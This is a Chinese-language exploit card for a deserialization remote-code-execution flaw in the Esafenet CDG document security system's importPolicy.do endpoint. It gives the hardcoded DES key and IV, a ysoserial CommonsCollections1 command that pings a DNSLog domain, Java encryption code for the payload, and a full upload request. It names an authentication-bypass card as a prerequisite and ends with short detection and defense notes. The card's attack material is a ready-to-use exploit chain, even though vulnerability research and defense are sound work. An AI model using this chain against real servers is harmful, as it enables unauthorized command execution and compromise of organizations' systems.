---
id: web-java-component-esafenet-cdg-importpolicy-deserialization-rce
title: 亿赛通 CDG dlpPolicy/importPolicy.do 反序列化 RCE：上传文件经 DES(esafenet) 解密后 byteToObject，CC1 链执行命令
type: scenario
domain: web
path: web/java/component
technique: esafenet-cdg-importpolicy-deserialization-rce
aliases:
- 亿赛通 importPolicy 反序列化
- dlpPolicyFile
- EncryptUtil.encrypt
- CDGUtil DES esafenet
- 亿赛通后台 RCE
- CommonsCollections1 亿赛通
tags:
- java
- esafenet
- cdg
- deserialization
- rce
- des
- commons-collections
- oa
cve: []
affected_versions: 亿赛通电子文档安全管理系统 V5.0（原文复现环境；原文仅称旧版本，未给版本区间）
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V541
  verified_at: '2026-11-11T19:16:35+08:00'
  notes: 已对照原文与 18 张截图（图14-18）核对：importPolicy(@RequestParam dlpPolicyFile MultipartFile)→bs=file.getBytes()→EncryptUtil.encrypt(mode:2,bs)→(List)byteToObject(bs)（图14）、byteToObject 标准 ObjectInputStream.readObject 无白名单（图15）、EncryptUtil PASSKEY/DESKEY 与 IV 均 esafenet、DES/CBC/PKCS5Padding（图16）、上传 dlpPolicyFile=1.txt、响应 500 系统错误（图17）、DNSLog 收到 zkilvkinpf.dgrh3.cn A 记录（图18）均一致。方向核对：服务端 mode=2 即 Cipher.DECRYPT_MODE（解密），客户端以 ENCRYPT_MODE 加密 cc1.ser 后上传，卡内表述正确；原文正文『DES加密→反序列化』为笔误，以代码截图为准。commons-collections 3.1 依赖原文正文明确（截图 pom 亦见 commons-collections）。受影响版本按原文只称『旧版本』，卡内如实标注 V5.0 为原文复现环境，不 clear。dedup：仅与 CDG 文件上传/文件读取及其他反序列化 gadget 卡 related（不同接口/不同 gadget 场景），非同一链；dup-scan 无本篇 pair。未验证点：未复现；CC1 依赖目标 classpath 与 JDK 版本。
---

## 一句话结论

亿赛通电子文档安全管理系统的后台接口 `/CDGServer3/dlpPolicy/importPolicy.do` 接收上传文件 `dlpPolicyFile`，对其字节执行 `EncryptUtil.encrypt(2, bs)`（DES/CBC/PKCS5Padding，mode=2 即解密，key 与 IV 均为 `esafenet`）后直接交给 `byteToObject` 反序列化；攻击者用同一 DES 参数加密 ysoserial 的 CommonsCollections1 序列化数据后上传，即可在服务端执行任意命令。

## 原理

- 入口代码：
  ```java
  @RequestMapping({"/importPolicy.do"})
  public void importPolicy(@RequestParam(value = "dlpPolicyFile", required = true) MultipartFile file, ...) {
      byte[] bs = file.getBytes();
      ...
      if (bs != null) {
          bs = EncryptUtil.encrypt(2, bs);            // mode 2 = Cipher.DECRYPT_MODE
          List<PolicyPackage> policies = (List) this.byteToObject(bs);
          ...
      }
  }
  ```
  `EncryptUtil.encrypt(mode, bs)` 使用 `DES/CBC/PKCS5Padding`，`PASSKEY`/`DESKEY` 与 IV 均硬编码为 `esafenet`（原文截图 `EncryptUtil` 类）。
- `byteToObject` 是标准反序列化：
  ```java
  ByteArrayInputStream bis = new ByteArrayInputStream(bs);
  ObjectInputStream inputStream = new ObjectInputStream(bis);
  obj = inputStream.readObject();
  ```
  没有任何类白名单/ObjectInputFilter。
- 服务端先对上传内容做 DES 解密再反序列化，所以攻击者的输入应是“序列化 payload 的 DES 加密结果”：客户端用相同 key/IV 以加密模式处理 `cc1.ser`，服务端解密后得到原始序列化流并触发 gadget。
- 目标带 `commons-collections 3.1` 依赖（原文截图 Maven 依赖可见），使用 CommonsCollections1 链即可执行命令；实际危害取决于 JDK 版本与可用 gadget。
- 之所以成立：文件上传只是入口，真正的危险是“加密后的字节仍被当作可信序列化数据”；硬编码密钥使加密不构成任何安全边界。

## 触发条件

- 目标为存在 importPolicy.do 的亿赛通旧版本（原文复现 V5.0）。
- 攻击者持有后台会话（本接口为后台功能，可用 LinkFilterService 权限绕过获得，见关联卡）。
- 目标 classpath 存在可利用 gadget（如 commons-collections 3.1）且 JDK 版本允许 CC1。
- 攻击者能按 `esafenet` 密钥对序列化数据做 DES 加密。

## 利用步骤

1. 用 ysoserial 生成 CC1 序列化文件：
   ```bash
   java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'ping <dnslog域>' > cc1.ser
   ```
2. 用 Java 按 `DES/CBC/PKCS5Padding`（key/iv 均为 `esafenet`）对 `cc1.ser` 做加密，输出上传文件（原文脚本 `CDGdecode.desEncrypt`，也可直接调用厂商 jar 的 `EncryptUtil.encrypt(1, bytes)`）。
3. 携带后台会话向 `/CDGServer3/dlpPolicy/importPolicy.do` 发送 multipart 请求，文件字段名为 `dlpPolicyFile`。
4. 服务端 `EncryptUtil.encrypt(2, bs)` 解密后 `byteToObject`，触发 CC1 执行命令；用 DNSLog/回连确认。
5. 授权测试用无害命令（`ping`/`id`），避免破坏业务数据。

## PoC

加密脚本核心（原文）：

```java
Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
DESKeySpec dks = new DESKeySpec("esafenet".getBytes());
SecretKey securekey = SecretKeyFactory.getInstance("DES").generateSecret(dks);
IvParameterSpec iv = new IvParameterSpec("esafenet".getBytes());
cipher.init(Cipher.ENCRYPT_MODE, securekey, iv);   // 对应服务端 mode=2(DECRYPT)
byte[] bytes = cipher.doFinal(filebyte);           // filebyte = cc1.ser
```

上传请求（原文）：

```http
POST /CDGServer3/dlpPolicy/importPolicy.do HTTP/1.1
Host: target
Cookie: JSESSIONID=<后台会话>
Content-Type: multipart/form-data; boundary=----cz3j90uw

------cz3j90uw
Content-Disposition: form-data; name="dlpPolicyFile"; filename="1.txt"
Content-Type: application/octet-stream

<DES 加密后的 cc1.ser 字节>
------cz3j90uw--
```

原文使用 DNSLog 验证：`java -jar ysoserial... CommonsCollections1 'ping zkilvkinpf.dgrh3.cn'`，上传后 DNSLog 收到该域名的 A 记录查询，证明命令执行。

## 变体与关联

- 变体：gadget 可换目标 classpath 上可用的其他链（CC 其他版本、Spring 等）；上传字段名固定为 `dlpPolicyFile`。
- 关联：[[web-java-component-esafenet-cdg-linkfilterservice-auth-bypass]]（未授权取得后台会话，作为本卡前置）；[[web-generic-file-inclusion-cdg-decryptapplication-filepath-read]]、[[web-generic-file-upload-cdg-uploadsoftware-patch-traversal-webshell]]（亿赛通 CDG 其他接口漏洞）。
- 边界：接口增加鉴权、反序列化加 ObjectInputFilter 白名单、升级 gadget 依赖或更换硬编码密钥后失效。

## 检测与防御

- 检测：访问 `/CDGServer3/dlpPolicy/importPolicy.do` 上传非策略包内容；上传体为 DES 密文且解密后以 `AC ED 00 05`（Java 序列化魔数）开头；响应 500/异常页但伴随 DNS/HTTP 外连。
- 检测：后台会话短时间内从 LinkFilterService 建立后直接调用 importPolicy；`ObjectInputStream.readObject` 相关 gadget 类加载（commons-collections Transformer）。
- 防御：接口增加严格的会话/权限校验（不能仅依赖可绕过的 LinkFilter）；反序列化使用 ObjectInputFilter 类白名单，禁止 CommonsCollections 等危险类；策略包改用 JSON/签名格式而非 Java 序列化；及时升级修复版本。
